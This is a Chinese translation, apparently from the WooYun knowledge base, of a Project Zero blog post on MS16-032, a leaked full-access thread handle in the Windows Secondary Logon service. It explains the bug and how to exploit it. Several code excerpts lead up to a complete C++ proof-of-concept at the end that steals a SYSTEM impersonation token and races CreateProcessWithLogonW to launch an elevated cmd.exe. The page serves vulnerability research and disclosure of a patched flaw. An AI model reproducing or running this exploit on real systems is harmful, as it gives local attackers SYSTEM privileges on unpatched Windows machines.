@@ -1,0 +1,289 @@
+<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">Windows Secondary Logon服务中的一个句柄权限泄露Bug</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">路人甲</a> <span class="bull">·</span> <time title="2016/03/24 14:03" ui-time="" datetime="2016/03/24 14:03" class="published ng-binding ng-isolate-scope">2016/03/24 14:03</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><p>原文地址：<br><a href="https://googleprojectzero.blogspot.jp/2016/03/exploiting-leaked-thread-handle.html">https://googleprojectzero.blogspot.jp/2016/03/exploiting-leaked-thread-handle.html</a></p><h1>0x00 前言</h1><hr><p>原作者写了太多的从句，token handle换来换去，一大堆三四行没逗号的句子看得我头晕不已，如果手滑翻译错了，比如把令牌误打成句柄，请不要疑惑，联系我。</p><h1>0x01 Bug 本貌</h1><hr><p>我偶然发现了发现一个可以把在特权进程中打开的句柄泄漏到较低的特权进程的bug。Bug位于Windows Secondary Logon服务中，该漏洞可以泄漏一个具有完全访问权限的线程句柄。微软在MS16-032补丁中修复了这个bug。这篇博客将告诉你不用传统的内存损坏技术时，你将如何使用线程句柄来获得系统权限。</p><p>你可以在这里找到<a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=687&amp;redir=1">issue</a>。 Secondary Logon服务存在于Windows XP+。该服务暴露了一个允许正常的进程创建一个新的、带有不同token的进程的RPC终结点。从API的角度来看此功能是通过CreateProcessWithTokenW和CreateProcessWithLogonW 暴露出来的。他们行为非常像CreateProcessAsUser，有所不同的是，它不需SeAssignPrimaryTokenPrivilege（+AsUser），而是需要SeImpersonatePrivilege来模拟令牌。登录功能很便捷，它通过登录凭据，调用LsaLogonUser并使用所产生的令牌来创建进程。</p><p>这些API采取与正常的CreateProcess相同的参数（包括传句柄给stdin/stdout/stderror时也是一样）。句柄传递的过程允许控制台进程的输出和输入重定向到其它文件。当创建一个新的进程时，这些句柄通常是通过句柄继承转移到新的进程中。在Secondary Logon的例子中，服务不是新进程的实际父进程，所以它是手动从指定的父进程使用 DuplicateHandle API 复制句柄到新进程的。代码如下</p><pre><code>#!cpp
+// Contains, hStdInput, hStdOutout and hStdError.
+HANDLE StandardHandles[3] = {...};
+// Location of standard handle in target process PEB.
+PHANDLE HandleAddress = ...;
+
+for(int i = 0; i &lt; 3; ++i) {
+  if (StandardHandles[i]) {
+    if (StandardHandles[i] &amp; 0x10000003) != 3 ) {
+      HANDLE TargetHandle;
+      if (!DuplicateHandle(ParentProcess, StandardHandles[i], 
+          TargetProcess, &amp;TargetHandle, 0, TRUE, DUPLICATE_SAME_ACCESS))
+        return ERROR;
+      if (!WriteProcessMemory(TargetProcess, &amp;HandleAddress[i], 
+         &amp;TargetHandle, sizeof(TargetHandle)))
+        return ERROR;
+    }
+  }
+}
+</code></pre><p>代码从父进程（这是RPC的调用者）复制句柄到目标进程。然后将复制的句柄的值写入到新进程PEB ProcessParameters结构中，这可以通过API，例如GetStdHandle提取。句柄值看起来以某种方式进行了标准化：它检查了该句柄的低2位是否没有设置（在NT架构的系统中句柄值总是4的倍数），但它也检查29位是否没有设置。</p><p>为了性能方面的考虑，也为了开发更简单，NT内核有一个特殊处理，允许进程使用伪句柄引用当前进程或线程，而不用由它的PID/ TID打开该对象并通过完整访问权限来获取（虽然这样也能成功）。开发人员通常会通过GetCurrentProcess和GetCurrentThread的API获取到。我们可以看到下面的代码中展示出的特例:</p><pre><code>#!cpp
+NTSTATUS ObpReferenceProcessObjectByHandle(HANDLE       SourceHandle,
+                                           EPROCESS*    SourceProcess, 
+                                           ..., 
+                                           PVOID*       Object, 
+                                           ACCESS_MASK* GrantedAccess) {
+  if ((INT_PTR)SourceHandle &lt; 0) {
+    if (SourceHandle == (HANDLE)-1 ) {
+      *GrantedAccess = PROCESS_ALL_ACCESS;
+      *Object = SourceProcess;
+      return STATUS_SUCCESS;
+    } else if (SourceHandle == (HANDLE)-2) {
+      *GrantedAccess = THREAD_ALL_ACCESS;
+      *Object = KeGetCurrentThread();
+      return STATUS_SUCCESS;
+    }
+    return STATUS_INVALID_HANDLE;
+    
+    // Get from process handle table.
+}
+</code></pre><p>现在我们可以理解为什么代码检查29位了。它检查低2位是否设置了值（伪句柄 -1，-2），但即使较高的位被设置了，也一样应该被认为是有效的句柄。这便是错误根源所在。我们可以从内核代码发现，如果指定了-1，那么源进程就有完整的访问权限。但是，并没有什么用。因为源进程已经在我们的控制之下，并没有特权。</p><p>在另一方面，如果指定-2，则对当前线程有完全访问，但是该线程实际上是Secondary Logon服务，并且它也是用来处理RPC请求的线程池之一的现成。这显然是有问题的。</p><p>唯一的问题是如何我们才可以调用CreateProcessWithToken/Logon API来作为一个普通用户启动进程？调用者需要具有SeImpersonatePrivilege才行，但你很容易会考虑到以普通用户登录时，需要一个有效的用户帐号和密码，如果我们是一个恶意用户这是可以的，但如果我们在用漏洞攻击别人的话，还是不要这样为好。仔细看了看原来有一个特殊的标志，可以让我们不需要提供有效的凭证，名为LOGON&#95;NETCREDENTIALS&#95;ONLY。当它与登录API一起用于连接网络资源时，主令牌是基于主叫方的。这使我们无需特殊权限或需要用户的密码去创建进程。将其组合在一起，我们可以使用下面的代码捕获一个线程句柄：</p><pre><code>#!cpp
+HANDLE GetThreadHandle() {
+  PROCESS_INFORMATION procInfo = {};
+  STARTUPINFO startInfo = {};
+  startInfo.cb = sizeof(startInfo);
+
+  startInfo.hStdInput = GetCurrentThread();
+  startInfo.hStdOutput = GetCurrentThread();
+  startInfo.hStdError = GetCurrentThread();
+  startInfo.dwFlags = STARTF_USESTDHANDLES;
+
+  CreateProcessWithLogonW(L"test", L"test", L"test", 
+                          LOGON_NETCREDENTIALS_ONLY, nullptr, L"cmd.exe", 
+                          CREATE_SUSPENDED, nullptr, nullptr, 
+                          &amp;startInfo, &amp;procInfo);
+  HANDLE hThread = nullptr;  
+  DuplicateHandle(procInfo.hProcess, (HANDLE)0x4, 
+         GetCurrentProcess(), &amp;hThread, 0, FALSE, DUPLICATE_SAME_ACCESS);
+  TerminateProcess(procInfo.hProcess, 1);
+  CloseHandle(procInfo.hProcess);
+  CloseHandle(procInfo.hThread);
+  return hThread;
+} 
+</code></pre><h1>0x02 利用</h1><hr><p>利用环节。很幸运这个句柄属于一个线程池线程，这意味着该线程将用来处理其他RPC请求。如果线程只存在于服务的一个请求中，用完就渣都不剩了的话将是一个棘手很多的利用。</p><p>你可能会认为首先要设置线程上下文才能利用此泄露句柄。不管是处于调试目的还是为了要让另一个进程支持恢复执行，我们都需要用SetThreadContext。它将保存CONTEXT的状态，包括寄存器值，如RIP和RSP，当线程恢复执行时，读取保存的值就可以从指定位置执行。这似乎是一个好方法，但是肯定也有问题。</p><ul><li>它只是改变了用户模式执行上下文。如果线程是在non-alertable wait状态时，直到一些未确定的情况满足时，才会开始执行。</li><li>由于我们没有进程句柄，所以我们不能轻易地把shellcode注到内存中，所以我们需要ROP一下绕过DEP。</li><li>虽然我们可以把内存注入到进程中（比如通过RPC发送一个大buffer），但是注完了我们也不知道这片东西保存到哪儿了，特别是64位那么大的地址空间。虽然我们可以调用GetThreadContext来得到一个信息泄漏，但是还不够。</li><li>如果出错了那么服务就崩溃了，这是我们希望避免的。</li><li>虽然使用SetThreadContext方法来利用成功率100%，但是十分痛苦，如果我们能够避免ROP就更好了。所以我更想要一个合乎逻辑的漏洞，而在这个例子中的漏洞性质和服务都对我们有利。</li></ul><p>Secondary Logon服务的全部要点是创建任意token的新进程，所以如果我们能以某种方式欺骗服务使用特权访问令牌和绕过安全限制，我们应该能够提升我们的特权。咋整？让我们来看看服务实现CreateProcessWithLogon的代码序列。</p><pre><code>#!cpp
+RpcImpersonateClient();
+Process = OpenProcess(CallingProcess);
+Token = OpenThreadToken(Process)
+If Token IL &lt; MEDIUM_IL Then Error;
+RpcRevertToSelf();
+RpcImpersonateClient();
+Token = LsaLogonUser(...);
+RpcRevertToSelf();
+ImpersonateLoggedOnUser(Token);
+CreateProcessAsUser(Token, ...);
+RevertToSelf();
+</code></pre><p>这段代码大量使用了身份模拟，因为我们已经获取了一个带有THREAD_IMPERSONATE 访问权限的线程，所以我们可以设置线程的模拟令牌。如果我们在服务调用LsaLogonUser时设置了一个有权限的模拟句柄我们可以获取一个该token的拷贝，并可以用它来创建任意进程。</p><p>如果我们能够清除模拟令牌（然后它们会退回主系统句柄）事情就会简单得多。但是不幸的是IL check阻挡了我们的脚步。如果我们在错误的时间清除了句柄OpenThreadToken将会失败，并且IL检查会拒绝访问。所以我们需要从另一个地方拿到有权限的模拟令牌。有无数种方法能做到，比如通过WebDAV与NTML协商，但是这只会增加复杂度。能不能通过其他方法不借助其他资源来拿到token呢？</p><p>有个未文档化的nt系统调用NtImpersonateThread 可以帮上忙。</p><pre><code>#!cpp
+NTSTATUS NtImpersonateThread(HANDLE ThreadHandle, 
+                            HANDLE ThreadToImpersonate, 
+                            PSECURITY_QUALITY_OF_SERVICE SecurityQoS)
+</code></pre><p>这个系统调用允许你基于另一个线程的状态应用一个模拟token到一个线程上，如果源线程没有模拟token，内核就会从关联的进程主token创建一个。尽管没啥用，但是这可能让我们用同一个线程的句柄来为目标和源创建模拟。因为这是个系统服务，所以我们需要拿到一个系统模拟token。通过下面代码可以实现：</p><pre><code>#!cpp
+HANDLE GetSystemToken(HANDLE hThread) {
+  // Suspend thread just in case.
+  SuspendThread(hThread);
+
+  SECURITY_QUALITY_OF_SERVICE sqos = {};
+  sqos.Length = sizeof(sqos);
+  sqos.ImpersonationLevel = SecurityImpersonation;
+  // Clear existing thread token.
+  SetThreadToken(&amp;hThread, nullptr);
+  NtImpersonateThread(hThread, hThread, &amp;sqos);
+
+  // Open a new copy of the token.
+  HANDLE hToken = nullptr;
+  OpenThreadToken(hThread, TOKEN_ALL_ACCESS, FALSE, &amp;hToken);
+  ResumeThread(hThread);
+
+  return hToken;
+
+｝
+</code></pre><p>万事俱备。 我们启动一个线程来循环给泄漏的线程句柄设置系统模拟令牌。另一个线程里面我们调用CreateProcessWithLogon 直到新进程有有权限的令牌。我们能够通过检查主令牌来确定是否创建成功。因为默认情况下我们不能打开令牌，一旦我们打开了就成功了。</p><p>!&#91;p1&#93;&#91;1&#93;</p><p>这个简单的方法有个问题，就是线程池中有一堆线程可用，所以我们不能确保调用服务并且准确的调用到特定的线程。所以我们得运行n次，来获取到我们想要的句柄。只要我们拿到所有有可能拿到的线程的句柄，我们基本就十有八九成功了。</p><p>也许我们能通过调整线程优先级来提高可靠性。但是看起来这种方式也还可以，也不太会崩溃然后创建一个带无特权令牌的进程。在多个线程调用CreateProcessWithLogon也没有什么意义，因为服务有个全局锁防止重入。</p><p>我在文章最后粘上了利用代码。你需要确认下编译环境，位数是否正确，因为RPC调用可能会截断句柄。因为句柄值是指针，无符号数。当RPC方法转换32位句柄到64位句柄时会自动填充零，因此(DWORD)-2 不等于 (DWORD64)-2 ，会产生无效句柄值。</p><h1>0x03 结论</h1><hr><p>希望我通过这个文章描绘出了一个有趣的在有权限的服务中泄漏线程句柄的攻击方式。当然，它只在泄漏的线程句柄用作能够直接给予我们进程创建能力的服务，但是你也可以用这种方式创建任意文件或其他资源。你可以通过内存损坏利用技术来达到这个目的，但是你不一定需要这么做。</p><h1>0x04 代码</h1><hr><pre><code>#!cpp
+#include &lt;stdio.h&gt;
+#include &lt;tchar.h&gt;
+#include &lt;Windows.h&gt;
+#include &lt;map&gt;
+
+#define MAX_PROCESSES 1000
+
+HANDLE GetThreadHandle()
+{
+  PROCESS_INFORMATION procInfo = {};
+  STARTUPINFO startInfo = {};
+  startInfo.cb = sizeof(startInfo);
+
+  startInfo.hStdInput = GetCurrentThread();
+  startInfo.hStdOutput = GetCurrentThread();
+  startInfo.hStdError = GetCurrentThread();
+  startInfo.dwFlags = STARTF_USESTDHANDLES;
+
+  if (CreateProcessWithLogonW(L"test", L"test", L"test", 
+               LOGON_NETCREDENTIALS_ONLY, 
+               nullptr, L"cmd.exe", CREATE_SUSPENDED, 
+               nullptr, nullptr, &amp;startInfo, &amp;procInfo))
+  {
+    HANDLE hThread;   
+    BOOL res = DuplicateHandle(procInfo.hProcess, (HANDLE)0x4, 
+             GetCurrentProcess(), &amp;hThread, 0, FALSE, DUPLICATE_SAME_ACCESS);
+    DWORD dwLastError = GetLastError();
+    TerminateProcess(procInfo.hProcess, 1);
+    CloseHandle(procInfo.hProcess);
+    CloseHandle(procInfo.hThread);
+    if (!res)
+    {
+      printf("Error duplicating handle %d\n", dwLastError);
+      exit(1);
+    }
+
+    return hThread;
+  }
+  else
+  {
+    printf("Error: %d\n", GetLastError());
+    exit(1);
+  }
+}
+
+typedef NTSTATUS __stdcall NtImpersonateThread(HANDLE ThreadHandle, 
+      HANDLE ThreadToImpersonate, 
+      PSECURITY_QUALITY_OF_SERVICE SecurityQualityOfService);
+
+HANDLE GetSystemToken(HANDLE hThread)
+{
+  SuspendThread(hThread);
+
+  NtImpersonateThread* fNtImpersonateThread = 
+     (NtImpersonateThread*)GetProcAddress(GetModuleHandle(L"ntdll"), 
+                                          "NtImpersonateThread");
+  SECURITY_QUALITY_OF_SERVICE sqos = {};
+  sqos.Length = sizeof(sqos);
+  sqos.ImpersonationLevel = SecurityImpersonation;
+  SetThreadToken(&amp;hThread, nullptr);
+  NTSTATUS status = fNtImpersonateThread(hThread, hThread, &amp;sqos);
+  if (status != 0)
+  {
+    ResumeThread(hThread);
+    printf("Error impersonating thread %08X\n", status);
+    exit(1);
+  }
+
+  HANDLE hToken;
+  if (!OpenThreadToken(hThread, TOKEN_DUPLICATE | TOKEN_IMPERSONATE, 
+                       FALSE, &amp;hToken))
+  {
+    printf("Error opening thread token: %d\n", GetLastError());
+    ResumeThread(hThread);    
+    exit(1);
+  }
+
+  ResumeThread(hThread);
+
+  return hToken;
+}
+
+struct ThreadArg
+{
+  HANDLE hThread;
+  HANDLE hToken;
+};
+
+DWORD CALLBACK SetTokenThread(LPVOID lpArg)
+{
+  ThreadArg* arg = (ThreadArg*)lpArg;
+  while (true)
+  {
+    if (!SetThreadToken(&amp;arg-&gt;hThread, arg-&gt;hToken))
+    {
+      printf("Error setting token: %d\n", GetLastError());
+      break;
+    }
+  }
+  return 0;
+}
+
+int main()
+{
+  std::map&lt;DWORD, HANDLE&gt; thread_handles;
+  printf("Gathering thread handles\n");
+
+  for (int i = 0; i &lt; MAX_PROCESSES; ++i) {
+    HANDLE hThread = GetThreadHandle();
+    DWORD dwTid = GetThreadId(hThread);
+    if (!dwTid)
+    {
+      printf("Handle not a thread: %d\n", GetLastError());
+      exit(1);
+    }
+
+    if (thread_handles.find(dwTid) == thread_handles.end())
+    {
+      thread_handles[dwTid] = hThread;
+    }
+    else
+    {
+      CloseHandle(hThread);
+    }
+  }
+
+  printf("Done, got %zd handles\n", thread_handles.size());
+  
+  if (thread_handles.size() &gt; 0)
+  {
+    HANDLE hToken = GetSystemToken(thread_handles.begin()-&gt;second);
+    printf("System Token: %p\n", hToken);
+    
+    for (const auto&amp; pair : thread_handles)
+    {
+      ThreadArg* arg = new ThreadArg;
+
+      arg-&gt;hThread = pair.second;
+      DuplicateToken(hToken, SecurityImpersonation, &amp;arg-&gt;hToken);
+
+      CreateThread(nullptr, 0, SetTokenThread, arg, 0, nullptr);
+    }
+
+    while (true)
+    {
+      PROCESS_INFORMATION procInfo = {};
+      STARTUPINFO startInfo = {};
+      startInfo.cb = sizeof(startInfo);     
+
+      if (CreateProcessWithLogonW(L"test", L"test", L"test", 
+              LOGON_NETCREDENTIALS_ONLY, nullptr, 
+              L"cmd.exe", CREATE_SUSPENDED, nullptr, nullptr, 
+              &amp;startInfo, &amp;procInfo))
+      {
+        HANDLE hProcessToken;
+        // If we can't get process token good chance it's a system process.
+        if (!OpenProcessToken(procInfo.hProcess, MAXIMUM_ALLOWED, 
+                              &amp;hProcessToken))
+        {
+          printf("Couldn't open process token %d\n", GetLastError());
+          ResumeThread(procInfo.hThread);
+          break;
+        }
+        // Just to be sure let's check the process token isn't elevated.
+        TOKEN_ELEVATION elevation;
+        DWORD dwSize =0;
+        if (!GetTokenInformation(hProcessToken, TokenElevation, 
+                              &amp;elevation, sizeof(elevation), &amp;dwSize))
+        {
+          printf("Couldn't get token elevation: %d\n", GetLastError());
+          ResumeThread(procInfo.hThread);
+          break;
+        }
+
+        if (elevation.TokenIsElevated)
+        {
+          printf("Created elevated process\n");
+          break;
+        }
+
+        TerminateProcess(procInfo.hProcess, 1);
+        CloseHandle(procInfo.hProcess);
+        CloseHandle(procInfo.hThread);
+      }     
+    }
+  }
+
+  return 0;
+}
+</code></pre><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div id="comments" class="comment-list clearfix"><div id="comment-list"></div></div></div></main>
